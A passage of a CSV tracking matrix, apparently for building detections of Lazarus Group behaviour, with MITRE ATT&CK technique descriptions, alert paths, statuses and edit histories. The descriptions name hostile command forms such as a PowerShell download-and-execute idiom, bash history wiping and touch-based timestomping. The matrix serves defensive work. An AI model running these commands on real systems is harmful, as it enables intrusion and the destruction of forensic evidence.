""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1056.001,Keylogging,"Collection, Credential-Access",Pending,alerts\Lazarus_Group\T1056.001_Keylogging.html,,APT Matrix Generator,"Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)  Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:  * Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data. * Reading raw keystroke data from the hardware buffer. * Windows Registry modifications. * Custom drivers. * [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) ",https://attack.mitre.org/techniques/T1056/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1057,Process Discovery,Discovery,Pending,alerts\Lazarus_Group\T1057_Process_Discovery.html,,APT Matrix Generator,"Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.  In Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. ESXi also supports use of the `ps` command, as well as `esxcli system process list`.(Citation: Sygnia ESXi Ransomware 2025)(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)  On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show processes` can be used to display current running processes.(Citation: US-CERT-TA18-106A)(Citation: show_processes_cisco_cmd)",https://attack.mitre.org/techniques/T1057/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1059.001,PowerShell,Execution,Tested,alerts\Lazarus_Group\T1059.001_PowerShell.html,,APT Matrix Generator,"Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).  PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.  A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)  PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)",https://attack.mitre.org/techniques/T1059/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1059.003,Windows Command Shell,Execution,Pending,alerts\Lazarus_Group\T1059.003_Windows_Command_Shell.html,,APT Matrix Generator,"Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH in Windows)  Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.  Adversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106) to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106) interactively with input and output forwarded over a command and control channel.",https://attack.mitre.org/techniques/T1059/003/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1059.005,Visual Basic,Execution,Pending,alerts\Lazarus_Group\T1059.005_Visual_Basic.html,,APT Matrix Generator,"Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)  Derivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)  Adversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) to enable execution).(Citation: Default VBS macros Blocking )",https://attack.mitre.org/techniques/T1059/005/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1070,Indicator Removal,Defense-Evasion,Pending,alerts\Lazarus_Group\T1070_Indicator_Removal.html,,APT Matrix Generator,"Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.  Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",https://attack.mitre.org/techniques/T1070/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1070.003,Clear Command History,Defense-Evasion,Pending,alerts\Lazarus_Group\T1070.003_Clear_Command_History.html,,APT Matrix Generator,"In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.  On Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions. Adversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.    Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A) On ESXi servers, command history may be manually removed from the `/var/log/shell.log` file.(Citation: Broadcom ESXi Shell Audit)  On Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.  The <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)  Adversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",https://attack.mitre.org/techniques/T1070/003/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1070.004,File Deletion,Defense-Evasion,Pending,alerts\Lazarus_Group\T1070.004_File_Deletion.html,,APT Matrix Generator,"Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.  There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well.(Citation: Microsoft SDelete July 2016) Examples of built-in [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) functions include <code>del</code> on Windows, <code>rm</code> or <code>unlink</code> on Linux and macOS, and `rm` on ESXi.",https://attack.mitre.org/techniques/T1070/004/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1070.006,Timestomp,Defense-Evasion,Pending,alerts\Lazarus_Group\T1070.006_Timestomp.html,,APT Matrix Generator,"Adversaries may modify file time attributes to hide new files or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder and blend malicious files with legitimate files.  In Windows systems, both the `$STANDARD_INFORMATION` (`$SI`) and `$FILE_NAME` (`$FN`) attributes record times in a Master File Table (MFT) file.(Citation: Inversecos Timestomping 2022) `$SI` (dates/time stamps) is displayed to the end user, including in the File System view, while `$FN` is dealt with by the kernel.(Citation: Magnet Forensics)  Modifying the `$SI` attribute is the most common method of timestomping because it can be modified at the user level using API calls. `$FN` timestomping, however, typically requires interacting with the system kernel or moving or renaming a file.(Citation: Inversecos Timestomping 2022)  Adversaries modify timestamps on files so that they do not appear conspicuous to forensic investigators or file analysis tools. In order to evade detections that rely on identifying discrepancies between the `$SI` and `$FN` attributes, adversaries may also engage in “double timestomping” by modifying times on both attributes simultaneously.(Citation: Double Timestomping)  In Linux systems and on ESXi servers, threat actors may attempt to perform timestomping using commands such as `touch -a -m -t <timestamp> <filename>` (which sets access and modification times to a specific value) or `touch -r <filename> <filename>` (which sets access and modification times to match those of another file).(Citation: Inversecos Linux Timestomping)(Citation: Juniper Networks ESXi Backdoor 2022)  Timestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)",https://attack.mitre.org/techniques/T1070/006/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1071.001,Web Protocols,Command-And-Control,Pending,alerts\Lazarus_Group\T1071.001_Web_Protocols.html,,APT Matrix Generator,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.   Protocols such as HTTP/S(Citation: CrowdStrike Putter Panda) and WebSocket(Citation: Brazking-Websockets) that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",https://attack.mitre.org/techniques/T1071/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1074.001,Local Data Staging,Collection,Pending,alerts\Lazarus_Group\T1074.001_Local_Data_Staging.html,,APT Matrix Generator,"Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.  Adversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)",https://attack.mitre.org/techniques/T1074/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1078,Valid Accounts,"Defense-Evasion, Initial-Access, Persistence, Privilege-Escalation",Pending,alerts\Lazarus_Group\T1078_Valid_Accounts.html,,APT Matrix Generator,"Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.  In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)  The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",https://attack.mitre.org/techniques/T1078/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1082,System Information Discovery,Discovery,Pending,alerts\Lazarus_Group\T1082_System_Information_Discovery.html,,APT Matrix Generator,"An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.  Tools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information (e.g. <code>show version</code>).(Citation: US-CERT-TA18-106A) On ESXi servers, threat actors may gather system information from various esxcli utilities, such as `system hostname get`, `system version get`, and `storage filesystem list` (to list storage volumes).(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: Varonis)  Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)  [System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques) ",https://attack.mitre.org/techniques/T1082/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1083,File and Directory Discovery,Discovery,Pending,alerts\Lazarus_Group\T1083_File_and_Directory_Discovery.html,,APT Matrix Generator,"Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.  Many command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).(Citation: US-CERT-TA18-106A)  Some files and directories may require elevated or specific user permissions to access.",https://attack.mitre.org/techniques/T1083/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1090.001,Internal Proxy,Command-And-Control,Pending,alerts\Lazarus_Group\T1090.001_Internal_Proxy.html,,APT Matrix Generator,"Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.  By using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.",https://attack.mitre.org/techniques/T1090/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1090.002,External Proxy,Command-And-Control,Pending,alerts\Lazarus_Group\T1090.002_External_Proxy.html,,APT Matrix Generator,"Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.  External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.",https://attack.mitre.org/techniques/T1090/002/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1098,Account Manipulation,"Persistence, Privilege-Escalation",Pending,alerts\Lazarus_Group\T1098_Account_Manipulation.html,,APT Matrix Generator,"Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups.(Citation: FireEye SMOKEDHAM June 2021) These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials.   In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078).",https://attack.mitre.org/techniques/T1098/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1102.002,Bidirectional Communication,Command-And-Control,Pending,alerts\Lazarus_Group\T1102.002_Bidirectional_Communication.html,,APT Matrix Generator,"Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet.   Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. ",https://attack.mitre.org/techniques/T1102/002/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1104,Multi-Stage Channels,Command-And-Control,Pending,alerts\Lazarus_Group\T1104_Multi-Stage_Channels.html,,APT Matrix Generator,"Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.  Remote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.  The different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage communication path is discovered and blocked.",https://attack.mitre.org/techniques/T1104/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1105,Ingress Tool Transfer,Command-And-Control,Pending,alerts\Lazarus_Group\T1105_Ingress_Tool_Transfer.html,,APT Matrix Generator,"Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)).   On Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)  A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via `certutil -hashfile`).(Citation: Google Cloud Threat Intelligence COSCMICENERGY 2023)  Adversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution](https://attack.mitre.org/techniques/T1204) (typically after interacting with [Phishing](https://attack.mitre.org/techniques/T1566) lures).(Citation: T1105: Trellix_search-ms)  Files can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.(Citation: Dropbox Malware Sync)",https://attack.mitre.org/techniques/T1105/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1106,Native API,Execution,Pending,alerts\Lazarus_Group\T1106_Native_API.html,,APT Matrix Generator,"Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.  Adversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.  Native API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.(Citation: OutFlank System Calls)(Citation: CyberBit System Calls)(Citation: MDSec System Calls) For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC)  Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)  Adversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks.(Citation: Redops Syscalls) Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001).",https://attack.mitre.org/techniques/T1106/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
